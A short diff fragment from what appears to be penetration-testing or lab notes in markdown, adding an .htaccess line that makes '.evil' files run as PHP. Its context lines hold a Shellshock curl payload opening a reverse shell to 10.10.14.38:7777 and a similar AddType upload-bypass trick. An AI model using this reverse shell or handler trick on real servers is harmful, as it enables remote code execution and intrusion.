@@ -1509,6 +1509,9 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 # cat .htaccess
 AddType application/x-httpd-php .php16
 ```
+```bash
+AddType application/x-httpd-php .evil
+```
     
 </details>
 
